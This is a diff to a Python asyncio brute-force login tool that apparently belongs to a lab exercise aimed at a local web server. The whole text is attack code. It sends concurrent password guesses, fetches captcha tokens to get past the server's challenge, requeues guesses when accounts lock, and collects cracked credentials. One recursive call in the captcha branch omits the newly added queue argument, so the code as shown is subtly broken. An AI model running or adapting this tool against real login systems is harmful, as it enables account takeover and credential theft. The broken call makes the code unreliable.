@@ -9,8 +9,8 @@ GROUP_SEED = '496905569'
 TARGET_URL = 'http://localhost:5000'
 CONCURRENT_REQUESTS = 100
 
-lock = asyncio.Lock()
-captcha = None
+lock = None
+captcha_event = None
 cracked = {}
 attempts_count = 0
 queue = None
@@ -41,12 +41,13 @@ def stop_attack():
     return cracked
 
 async def _attack(users, max_attempts, max_duration_min, producer_args):
-    global cracked, attempts_count, queue, captcha
+    global cracked, attempts_count, lock, queue, captcha_event
     cracked = {}
     attempts_count = 0
     queue = asyncio.Queue(maxsize=CONCURRENT_REQUESTS*10)
-    captcha = asyncio.Event()
-    captcha.set()
+    lock = asyncio.Lock()
+    captcha_event = asyncio.Event()
+    captcha_event.set()
     start = time()
     total_users = len(users)
     async with aiohttp.ClientSession() as session:
@@ -83,54 +84,60 @@ async def _producer_bf(queue, users, charset, max_length):
                     await queue.put([username, password])
                 except asyncio.QueueShutDown:
                     return
-    await queue.put(None)
 
 async def _consumer(session, queue, total_users, start, max_attempts, max_duration_min):
     while True:
         try:
-            item = await queue.get()
+            item = await asyncio.wait_for(queue.get(), timeout=3.0)
         except asyncio.QueueShutDown:
             break
-        if item is None:
-            queue.task_done()
-            queue.shutdown(immediate=False)
+        except asyncio.TimeoutError:
+            queue.shutdown(immediate=True)
             break
         username, password = item
-        await captcha.wait()
-        result = await _attempt_login(session, username, password)
         global cracked, attempts_count
         async with lock:
-            if result is None and username not in cracked: cracked[username] = None
-            elif result: cracked[username] = password
-            attempts_count += 1
+            user_cracked = username in cracked
+        if not user_cracked:
+            await captcha_event.wait()
+            result = await _attempt_login(session, queue, username, password)
+            async with lock:
+                if result is None and username not in cracked: cracked[username] = None
+                elif result: cracked[username] = password
+                attempts_count += 1
+                queue.task_done()
+                if len(cracked) == total_users or attempts_count > max_attempts or time() - start > max_duration_min * 60:
+                    queue.shutdown(immediate=True)
+                    break
+        else:
             queue.task_done()
-            if len(cracked) == total_users or attempts_count > max_attempts or time() - start > max_duration_min * 60:
-                queue.shutdown(immediate=True)
-                break
 
-async def _attempt_login(session, username, password):
+async def _attempt_login(session, queue, username, password):
     payload = {'username': username, 'password': password}
-    await captcha.wait()
+    await captcha_event.wait()
     async with session.post(TARGET_URL + '/login', data=payload) as response:
         html = await response.text()
-        return await _handle_html_response(session, html, username, password)
+        return await _handle_html_response(session, queue, html, username, password)
     
-async def _handle_html_response(session, html, username, password):
+async def _handle_html_response(session, queue, html, username, password):
     soup = BeautifulSoup(html, 'html.parser')
     msg = soup.find(id="msg").get_text().strip()
     if msg.startswith("locked for"):
-        await asyncio.sleep(60)
-        return await _attempt_login(session, username, password)
-    if msg == "wrong token":
-        await captcha.wait()
-        captcha.clear()
+        try:
+            await queue.put([username, password])
+            return False
+        except asyncio.QueueShutDown:
+            return False
+    elif msg == "wrong token":
+        await captcha_event.wait()
+        captcha_event.clear()
         token = await _get_captcha_token(session)
         payload = {'username': username, 'password': password, 'captcha': token}
         async with session.post(TARGET_URL + '/login', data=payload) as response:
             html = await response.text()
-            captcha.set()
+            captcha_event.set()
             return await _handle_html_response(session, html, username, password)
-    if msg == "locked" or msg == "wrong OTP":
+    elif msg == "locked" or msg == "wrong OTP":
         return None
     return msg == "logged in"
 
